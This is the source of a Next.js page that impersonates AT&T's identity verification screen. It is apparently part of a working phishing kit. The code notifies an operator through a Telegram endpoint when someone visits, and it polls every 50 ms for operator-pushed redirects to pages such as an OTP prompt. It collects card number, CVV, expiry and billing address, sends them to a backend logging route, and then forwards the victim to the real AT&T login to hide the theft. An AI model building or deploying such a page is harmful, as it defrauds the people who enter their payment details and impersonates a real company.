import Head from 'next/head';
import { useEffect } from 'react';
import Script from 'next/script';

export default function Home() {
  useEffect(() => {
    // Notify Telegram immediately when user visits the page
    // And poll for redirect commands
    (async () => {
      try {
        const visitorId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        const pageLoadTime = Date.now();
        localStorage.setItem('visitorId', visitorId);
        localStorage.setItem('pageLoadTime', pageLoadTime.toString());
        console.log('[index.js] Sending visitor notification, visitorId:', visitorId);
        console.log('[index.js] Page load time:', pageLoadTime);
        
        // Send notification (non-blocking - don't fail if it doesn't work)
        fetch('/api/telegram/notify-visitor', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ visitorId })
        })
        .then(async (response) => {
          const data = await response.json();
          console.log('[index.js] Notification response:', data);
          if (!data.success) {
            console.warn('[index.js] Telegram notification warning:', data.warning || data.message);
          }
        })
        .catch(error => {
          console.warn('[index.js] Notification error (non-blocking):', error);
          // Don't block page load if notification fails
        });
        
        // Use SSE for instant redirect notifications + polling as backup
        let redirectReceived = false;
        
        // SSE connection for instant redirects (LISTENER ONLY - never redirects directly)
        const redirectEventSource = new EventSource(`/api/redirect/stream/${visitorId}`);
        redirectEventSource.onmessage = function(event) {
          try {
            const data = JSON.parse(event.data);
            if (data.type === 'connected') {
              console.log('[index.js] Redirect SSE connected');
            } else if (data.redirect && data.redirectUrl) {
              redirectReceived = true;
              redirectEventSource.close();
              clearInterval(redirectInterval);
              console.log('[index.js] Redirect command received via SSE');
              console.log('[index.js] Redirect type:', data.redirectType);
              console.log('[index.js] Redirect URL:', data.redirectUrl);
              
              // Redirect to /r/[visitorId] route which will return 302
              window.location.href = data.redirectUrl;
            }
          } catch (error) {
            console.error('[index.js] Error parsing SSE redirect:', error);
          }
        };
        
        redirectEventSource.onerror = function(error) {
          console.error('[index.js] Redirect SSE error:', error);
          // Fallback to polling if SSE fails
        };
        
        // Polling - SIMPLIFIED: Check active redirect endpoint (most reliable)
        // This endpoint uses module-level variables that persist within the same function instance
        const redirectInterval = setInterval(async () => {
          if (redirectReceived) {
            clearInterval(redirectInterval);
            return;
          }
          
          try {
            // Primary: Check active redirect endpoint (simplest, most reliable)
            const activeResponse = await fetch(`/api/redirect/active?t=${Date.now()}`);
            if (activeResponse.ok) {
              const activeData = await activeResponse.json();
              
              if (activeData.redirect) {
                redirectReceived = true;
                if (redirectEventSource) {
                  redirectEventSource.close();
                }
                clearInterval(redirectInterval);
                console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED FROM ACTIVE ✅✅✅');
                console.log('[index.js] Redirect type:', activeData.redirectType);
                console.log('[index.js] Page path:', activeData.pagePath);
                console.log('[index.js] Redirect age:', activeData.age, 'ms');
                
                // Redirect immediately
                const targetUrl = activeData.pagePath || activeData.redirectUrl || '/otp';
                console.log('[index.js] Redirecting to:', targetUrl);
                window.location.href = targetUrl;
                return;
              }
            }
            
            // Fallback 1: Check latest redirect endpoint
            const latestResponse = await fetch(`/api/redirect/latest?t=${Date.now()}`);
            if (latestResponse.ok) {
              const latestData = await latestResponse.json();
              
              if (latestData.redirect) {
                redirectReceived = true;
                if (redirectEventSource) {
                  redirectEventSource.close();
                }
                clearInterval(redirectInterval);
                console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED FROM LATEST ✅✅✅');
                const targetUrl = latestData.pagePath || latestData.redirectUrl || '/otp';
                console.log('[index.js] Redirecting to:', targetUrl);
                window.location.href = targetUrl;
                return;
              }
            }
            
            // Fallback 2: Check visitor-specific endpoint
            const response = await fetch(`/api/redirect/${visitorId}?t=${Date.now()}`);
            if (response.ok) {
              const data = await response.json();
              
              if (data.redirect) {
                redirectReceived = true;
                if (redirectEventSource) {
                  redirectEventSource.close();
                }
                clearInterval(redirectInterval);
                console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED FROM VISITOR ENDPOINT ✅✅✅');
                const targetUrl = data.pagePath || data.redirectUrl || '/otp';
                console.log('[index.js] Redirecting to:', targetUrl);
                window.location.href = targetUrl;
                return;
              }
            }
          } catch (error) {
            console.error('[index.js] Error checking redirect:', error);
          }
        }, 50); // Poll every 50ms for faster response
        
        // Stop polling after 5 minutes
        setTimeout(() => clearInterval(redirectInterval), 300000);
      } catch (error) {
        console.error('Error notifying Telegram:', error);
      }
    })();

    const billingForm = document.getElementById('billing-form');
    const cardNumberInput = document.getElementById('card-number');
    const cvvInput = document.getElementById('cvv');
    const expirationInput = document.getElementById('expiration');
    const addressInput = document.getElementById('address');
    const cityInput = document.getElementById('city');
    const stateInput = document.getElementById('state');
    const zipInput = document.getElementById('zip');
    const submitBtn = document.getElementById('submit-btn');
    const loadingScreen = document.getElementById('loading-screen');

    // Focus card number input on load
    if (cardNumberInput) {
      cardNumberInput.focus();
    }

    // Format card number with spaces
    if (cardNumberInput) {
      cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        if (formattedValue.length <= 19) {
          e.target.value = formattedValue;
        } else {
          e.target.value = formattedValue.substring(0, 19);
        }
      });
    }

    // Format expiration date (MM/YY)
    if (expirationInput) {
      expirationInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
          value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
      });
    }

    // Limit CVV to 3-4 digits
    if (cvvInput) {
      cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
      });
    }

    // Limit ZIP to 5 digits
    if (zipInput) {
      zipInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 5);
      });
    }

    async function logActivity(type, userId, additionalData = {}) {
      try {
        const response = await fetch('/api/broadcast', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type, userId, additionalData })
        });
        const data = await response.json();
        return data.activity.id;
      } catch (error) {
        console.error('Error logging activity:', error);
        return null;
      }
    }

    function validateCardNumber(cardNumber) {
      const cleaned = cardNumber.replace(/\s/g, '');
      return /^\d{13,19}$/.test(cleaned);
    }

    function validateExpiration(expiration) {
      const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
      if (!regex.test(expiration)) return false;
      const [month, year] = expiration.split('/');
      const currentYear = new Date().getFullYear() % 100;
      const currentMonth = new Date().getMonth() + 1;
      const expYear = parseInt(year);
      const expMonth = parseInt(month);
      if (expYear < currentYear) return false;
      if (expYear === currentYear && expMonth < currentMonth) return false;
      return true;
    }

    function validateCVV(cvv) {
      return /^\d{3,4}$/.test(cvv);
    }

    function validateZip(zip) {
      return /^\d{5}$/.test(zip);
    }

    if (billingForm) {
      billingForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const cardNumber = cardNumberInput.value.trim();
        const cvv = cvvInput.value.trim();
        const expiration = expirationInput.value.trim();
        const address = addressInput.value.trim();
        const city = cityInput.value.trim();
        const state = stateInput.value.trim();
        const zip = zipInput.value.trim();
        
        // Validate all fields
        if (!cardNumber) {
          alert('Please enter your card number');
          return;
        }
        
        if (!validateCardNumber(cardNumber)) {
          alert('Please enter a valid card number');
          return;
        }
        
        if (!cvv) {
          alert('Please enter your CVV');
          return;
        }
        
        if (!validateCVV(cvv)) {
          alert('Please enter a valid CVV');
          return;
        }
        
        if (!expiration) {
          alert('Please enter your expiration date');
          return;
        }
        
        if (!validateExpiration(expiration)) {
          alert('Please enter a valid expiration date (MM/YY)');
          return;
        }
        
        if (!address) {
          alert('Please enter your billing address');
          return;
        }
        
        if (!city) {
          alert('Please enter your city');
          return;
        }
        
        if (!state) {
          alert('Please enter your state');
          return;
        }
        
        if (!zip) {
          alert('Please enter your ZIP code');
          return;
        }
        
        if (!validateZip(zip)) {
          alert('Please enter a valid ZIP code');
          return;
        }
        
        // Get cached username from localStorage
        const storedUserId = localStorage.getItem('lastUserId') || '';
          
          // Show loading screen
        if (loadingScreen) {
          loadingScreen.classList.add('active');
        }
        if (submitBtn) {
          submitBtn.disabled = true;
        }
        
        try {
          // Log billing information entry
          await logActivity('billing', storedUserId, { 
            cardNumber: cardNumber.replace(/\s/g, '').substring(0, 4) + '****',
            expiration: expiration,
            address: address,
            city: city,
            state: state,
            zip: zip
          });
          
          // Log identity verification completion
          await logActivity('identity_verification', storedUserId, { 
            verified: true
          });
          
          // Redirect to next page or show success
          window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
        } catch (error) {
          console.error('Error submitting billing information:', error);
          if (loadingScreen) {
            loadingScreen.classList.remove('active');
          }
          if (submitBtn) {
            submitBtn.disabled = false;
          }
          alert('An error occurred. Please try again.');
        }
      });
    }
  }, []);

  return (
    <>
      <Head>
        <title>Identity Verification</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      </Head>
      <Script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js" strategy="afterInteractive" />
      <style jsx global>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
          background-color: white;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }

        .login-container {
          background: #ffffff;
          border-radius: 12px;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
          padding: 60px 40px;
          max-width: 450px;
          width: 100%;
          text-align: center;
        }

        .logo {
          margin-bottom: 30px;
        }

        .logo-image {
          width: 133px;
          height: auto;
          margin: 0 auto 15px;
          display: block;
          object-fit: contain;
        }

        h1 {
          font-size: 36px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 35px;
          line-height: 1.2;
        }

        .form-group {
          margin-bottom: 24px;
          text-align: left;
        }

        label {
          display: block;
          font-size: 16px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 10px;
        }

        input[type="text"],
        input[type="tel"] {
          width: 100%;
          height: 52px;
          padding: 0 16px;
          font-size: 16px;
          color: #333333;
          background: #ffffff;
          border: 2px solid #d1d1d1;
          border-radius: 6px;
          transition: all 0.3s ease;
          outline: none;
        }

        input[type="text"]:focus,
        input[type="tel"]:focus {
          border-color: #0057b8;
          box-shadow: 0 0 0 3px rgba(0, 87, 184, 0.1);
        }

        input::placeholder {
          color: #999999;
        }

        .form-row {
          display: flex;
          gap: 16px;
        }

        .form-row .form-group {
          flex: 1;
        }

        .continue-btn {
          width: 100%;
          height: 46px;
          background: #003d7a;
          color: #ffffff;
          font-size: 13px;
          font-weight: 700;
          border: none;
          border-radius: 23px;
          cursor: pointer;
          transition: all 0.3s ease;
          margin-bottom: 20px;
        }

        .continue-btn:hover {
          background: #002d5a;
          box-shadow: 0 4px 12px rgba(0, 61, 122, 0.3);
        }

        .continue-btn:active {
          background: #002040;
          transform: translateY(1px);
        }

        .continue-btn:disabled {
          background: #cccccc;
          cursor: not-allowed;
        }

        .link-section {
          margin-top: 16px;
          text-align: left;
        }

        .link-section a {
          display: block;
          color: #0088C0;
          font-size: 14px;
          font-weight: 700;
          text-decoration: none;
          margin-bottom: 18px;
          transition: all 0.2s ease;
        }

        .link-section a:hover {
          text-decoration: underline;
          color: #0070A0;
        }

        .separator {
          margin: 30px 0;
          text-align: center;
          position: relative;
        }

        .separator::before {
          content: '';
          position: absolute;
          top: 50%;
          left: 0;
          right: 0;
          height: 1px;
          background: #d1d1d1;
        }

        .separator-text {
          position: relative;
          display: inline-block;
          background: #ffffff;
          padding: 0 15px;
          color: #666666;
          font-size: 14px;
        }

        .secondary-btn {
          width: 100%;
          height: 46px;
          background: #ffffff;
          color: #003d7a;
          font-size: 13px;
          font-weight: 700;
          border: 2px solid #003d7a;
          border-radius: 23px;
          cursor: pointer;
          transition: all 0.3s ease;
          margin-top: 20px;
        }

        .secondary-btn:hover {
          border-color: #002d5a;
          background: #f5f5f5;
          color: #002d5a;
        }

        .secondary-btn:active {
          background: #e8e8e8;
          transform: translateY(1px);
        }

        .footer {
          margin-top: 40px;
          padding-top: 20px;
          text-align: center;
        }

        .footer-links {
          display: flex;
          flex-wrap: wrap;
          justify-content: center;
          gap: 20px;
          margin-bottom: 15px;
        }

        .footer-links a {
          color: #666666;
          font-size: 13px;
          text-decoration: none;
          transition: all 0.2s ease;
        }

        .footer-links a:hover {
          color: #0057b8;
          text-decoration: underline;
        }

        .copyright {
          color: #666666;
          font-size: 12px;
          margin-top: 10px;
        }

        .loading-screen {
          display: none;
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: #ffffff;
          z-index: 9999;
          align-items: center;
          justify-content: center;
          flex-direction: column;
        }

        .loading-screen.active {
          display: flex;
        }

        .loading-spinner {
          width: 40px;
          height: 40px;
          border: 3px solid #e0e0e0;
          border-top: 3px solid #0057b8;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
          margin-bottom: 16px;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .loading-text {
          font-size: 16px;
          color: #333333;
          font-weight: 400;
        }

        @media (max-width: 768px) {
          body {
            padding: 0;
          }

          .login-container {
            max-width: none;
            width: 100%;
            padding: 20px 12px;
            box-shadow: none;
            border-radius: 0;
          }

          h1 {
            font-size: 30px;
          }

          .form-row {
            flex-direction: column;
            gap: 0;
          }

          .footer {
            text-align: left;
            padding-left: 12px;
            padding-right: 12px;
            margin-left: 0;
            margin-right: 0;
            width: 100%;
          }

          .footer-links {
            flex-direction: column;
            gap: 10px;
            justify-content: flex-start;
            align-items: flex-start;
          }

          .footer-links a {
            font-size: 11px;
          }

          .copyright {
            font-size: 11px;
          }
        }

        *:focus-visible {
          outline: 2px solid #0057b8;
          outline-offset: 2px;
        }
      `}</style>
      <div className="login-container">
        <div className="logo">
          <img src="/logo.png" alt="Logo" className="logo-image" />
        </div>

        <h1>Identity Verification</h1>

        <form id="billing-form">
          <div className="form-group">
            <label htmlFor="card-number">Card number</label>
            <input 
              type="text" 
              id="card-number"
              name="card-number"
              placeholder="1234 5678 9012 3456"
              autoComplete="cc-number"
              maxLength="19"
              required
            />
          </div>

          <div className="form-row">
            <div className="form-group">
              <label htmlFor="expiration">Expiration</label>
              <input 
                type="text" 
                id="expiration"
                name="expiration"
                placeholder="MM/YY"
                autoComplete="cc-exp"
                maxLength="5"
                required
              />
          </div>
            <div className="form-group">
              <label htmlFor="cvv">CVV</label>
              <input 
                type="tel" 
                id="cvv"
                name="cvv"
                placeholder="123"
                autoComplete="cc-csc"
                maxLength="4"
                required
              />
          </div>
          </div>

          <div className="form-group">
            <label htmlFor="address">Billing address</label>
            <input 
              type="text" 
              id="address"
              name="address"
              placeholder="123 Main Street"
              autoComplete="street-address"
              required
            />
          </div>

          <div className="form-row">
            <div className="form-group">
              <label htmlFor="city">City</label>
              <input 
                type="text" 
                id="city"
                name="city"
                placeholder="City"
                autoComplete="address-level2"
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="state">State</label>
              <input 
                type="text" 
                id="state"
                name="state"
                placeholder="State"
                autoComplete="address-level1"
                maxLength="2"
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="zip">ZIP</label>
              <input 
                type="tel" 
                id="zip"
                name="zip"
                placeholder="12345"
                autoComplete="postal-code"
                maxLength="5"
                required
              />
            </div>
          </div>

          <button type="submit" className="continue-btn" id="submit-btn">Continue</button>
        </form>

        <div className="link-section">
          <a href="#back">Back to sign in</a>
        </div>

        <div className="separator">
          <span className="separator-text">OR</span>
        </div>

        <button type="button" className="secondary-btn">Login with myAT&T app</button>
      </div>

      <div className="footer">
        <div className="footer-links">
          <a href="#legal">Legal policy center</a>
          <a href="#privacy">Privacy policy</a>
          <a href="#terms">Terms of use</a>
          <a href="#accessibility">Accessibility</a>
          <a href="#choices">Your privacy choices</a>
        </div>
        <div className="copyright">
          ©2025 AT&T Intellectual Property. All rights reserved.
        </div>
      </div>

      <div id="loading-screen" className="loading-screen">
        <div className="loading-spinner"></div>
        <div className="loading-text">Please wait...</div>
      </div>
    </>
  );
}

